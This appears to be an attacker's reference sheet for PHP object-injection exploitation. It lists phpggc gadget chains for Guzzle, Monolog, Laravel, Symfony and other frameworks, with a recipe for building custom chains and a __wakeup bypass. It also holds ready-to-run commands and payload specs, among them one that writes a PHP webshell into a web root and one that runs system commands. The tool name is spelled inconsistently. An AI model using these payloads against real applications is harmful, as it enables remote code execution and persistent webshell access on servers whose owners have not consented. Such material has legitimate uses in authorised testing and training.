# PHP POP Chains — the per-framework gadget catalog

## How a phpgcc chain is read

```
Guzzle/RCE1      → package Guzzle, chain id RCE1 — calls a function
SwiftMailer/FW1  → package SwiftMailer, file-write chain 1
Drupal7/FD1      → file-delete chain
Monolog/FR1      → file-read chain
```

The suffix is the IMPACT type: `RCE`=function call, `FW`=file write,
`FD`=file delete, `FR`=file read, `CMD`=command exec, `SSRF`=URL fetch.

## The catalog by package

### Guzzle (HTTP client — on nearly every PHP app)

```
Guzzle/FW1     file write via CookieJar/SetCookieArray on destruct
Guzzle/RCE1    calls a function via FnStream on close
Guzzle/SSRF1   the client's own request — a URL fetch for OOB confirm
```

Recipe — the cookie-jar file-write:

```php
// Guzzle\Cookie\FileCookieJar::__destruct → persists $cookies to $filename
// Filename and cookie array are attacker-set → arbitrary file write
```

### Monolog (logger — nearly universal)

```
Monolog/RCE1   RotatingFileHandler stream → callback chain
Monolog/RCE2-7 version-split variants
Monolog/FW1    StreamHandler writes buffer to a path on destruct
Monolog/FR1    reads a file into the log record → reflected
```

Recipe — StreamHandler destruct file write:

```php
// StreamHandler::__destruct → write($this->buffer)
// buffer = your PHP code, streamUrl = php://filter/...resource=/path/shell.php
```

### Laravel

```
Laravel/RCE1-10   version-split — pick the chain covering the framework version
Laravel/FW1       PendingCommand / eval-file-write variant
Laravel/CMD1      system via process component
```

The Laravel chains hang on `Illuminate\*` classes — `PendingCommand`,
`Faker\Generator`, `InvokableBroadcast`. The `eval` sink is usually a
`call_user_func` on an attacker-named class+method.

### Symfony

```
Symfony/RCE1-11   version-split, most on PropertyAccessor/Serializer
Symfony/FW1-3     file write via FileLoader/CacheWarmer
Symfony/FD1       file delete
```

### SwiftMailer

```
SwiftMailer/FW1-3   writes a file when the transport flushes on destruct
```

### ThinkPHP / Yii / Slim / Zend / Magento / Drupal / Joomla / CodeIgniter / Phalcon / WordPress

```
ThinkPHP/RCE1-2, FW1-2   Yii/RCE1       Slim/RCE1
ZendFramework/RCE1-4, FD1, FW1, FR1
Magento/FW1-2, SQL1      Drupal7/RCE1, FD1   Joomla/RCE1-3
CodeIgniter4/RCE1-2      Phalcon/RCE1        WordPress/* (plugin-split)
```

## The DIY recipe — when no phpgcc chain covers the version

1. **Read composer.lock** — pin the exact package versions.
2. **Find the entry class** — any class with `__wakeup`/`__destruct`/
   `__toString`/`__call` that touches `$this->something`.
3. **Follow the prop** — `$this->handler->close()` → what classes can
   `handler` be? A class whose `close()`/`__toString()`/`shutdown()` does
   file/exec work.
4. **Assemble** — `php_ser_gen.py --spec` builds the nested `O:` graph.

```bash
python3 tools/php_ser_gen.py --spec '{
  "O":"Monolog\\Logger",
  "props":{
    "handlers":[
      {"O":"Monolog\\Handler\\StreamHandler",
       "props":{"stream":"php://filter/convert.base64-decode/resource=/var/www/html/s.php",
                "level":0,"bubble":true,"buffer":["<?=`id`?>"]}}
    ]
  }
}'
```

## `__wakeup` bypass inside chains

If the chain's entry is `__destruct` and a `__wakeup` resets the props —
declare MORE properties than you supply:

```
O:6:"Logger":3:{s:8:"\0*\0prop";O:...}   ← declares 3, supplies 1
```

PHP <5.6.25/7.0.10 skips `__wakeup` on the count mismatch → `__destruct`
still fires with the partial state.

## `use` function-arg packing

phpgcc chains take the *function* and *args* positionally:

```bash
phpggc Laravel/RCE5 system 'cat /flag'
phpggc Monolog/FW1 '/var/www/x.php' '<?php system($_GET["c"]);?>'
phpggc Symfony/RCE4 call_user_func 'phpinfo' -u   # -u URL-encodes
```

## The `fast destruct` flag

`-s` on some chains emits a "fast destruct" form that skips a `__wakeup`
sanity pass — worth trying when a chain fires but the props look reset.

## Version-mismatch failures and what they look like

- `Class 'X' not found` → the package isn't loaded for THIS class — wrong chain.
- The serialized stream is consumed silently (no error, no effect) → the
  magic method didn't fire, OR `allowed_classes` stripped it — check for
  `__PHP_Incomplete_Class` in the response/error log.
- `unserialize() error at offset N` → your hand-crafted bytes broke the
  grammar — use `php_ser_gen`.

## Output to record

- The phpgcc chain name + version match rationale
- Function + args exactly as passed
- The verbatim response excerpt proving the sink
